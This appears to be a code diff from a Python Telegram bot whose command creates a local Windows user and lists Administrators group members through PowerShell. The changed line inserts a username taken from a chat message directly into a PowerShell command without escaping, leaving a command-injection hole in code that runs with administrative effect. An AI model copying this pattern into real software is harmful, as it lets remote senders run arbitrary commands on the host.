@@ -111,7 +111,7 @@ async def newuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         '''
         run_powershell_command(add_new_user, True)
         
-        commandOutput = run_powershell_command('Get-LocalGroupMember -Group "Administrators"')
+        commandOutput = run_powershell_command(f'Get-LocalGroupMember -Group "Administrators" | Where-Object Name -eq "{context.args[0]}"')
         await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
 
     except ValueError:
